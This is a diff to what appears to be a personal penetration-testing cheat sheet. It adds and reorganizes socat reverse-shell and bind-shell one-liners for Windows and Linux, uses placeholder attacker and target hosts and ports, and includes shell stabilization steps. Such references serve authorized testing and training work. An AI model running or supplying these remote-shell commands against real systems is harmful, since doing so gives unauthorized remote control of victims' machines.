@@ -17,13 +17,17 @@ SHELLS AND STABILIZING METHODS
     (ON LOCAL, WITH SHELL BACKGROUNDED) stty raw -echo; fg;
     (WHEN DONE) reset
 
-  socat basic revshell listener:     socat TCP-L:[LPORT]
-  socat basic reverse shell windows: socat TCP:[LHOST]:[LPORT] EXEC:powershell.exe,pipes
-  socat basic reverse shell linux:   socat TCP:[LHOST]:[LPORT] EXEC:"bash -li"
+  possibly deprecated:
+    socat basic revshell listener:     socat TCP-L:[LPORT]
+    socat basic reverse shell windows: socat TCP:[LHOST]:[LPORT] EXEC:powershell.exe,pipes
+    socat basic reverse shell linux:   socat TCP:[LHOST]:[LPORT] EXEC:"bash -li"
 
-  socat basic bind shell windows:    socat TCP-L:[RPORT] EXEC:powershell.exe,pipes
-  socat basic bind shell linux:      socat TCP-L:[RPORT] EXEC:"bash -li"
-  connect to socat bind shell:       socat TCP:[RHOST]:[RPORT]
+    socat basic bind shell windows:    socat TCP-L:[RPORT] EXEC:powershell.exe,pipes
+    socat basic bind shell linux:      socat TCP-L:[RPORT] EXEC:"bash -li"
+    connect to socat bind shell:       socat TCP:[RHOST]:[RPORT]
+
+  socat basic bind shell linux:        socat -d -d TCP4-LISTEN:[RPORT] EXEC:/bin/bash
+  connect to socat bind shell:         socat - TCP4:[RHOST]:[RPORT]
 
   linux:
     socat stable revshell listener:    socat TCP-L:[LPORT] FILE:`tty`,raw,echo=0
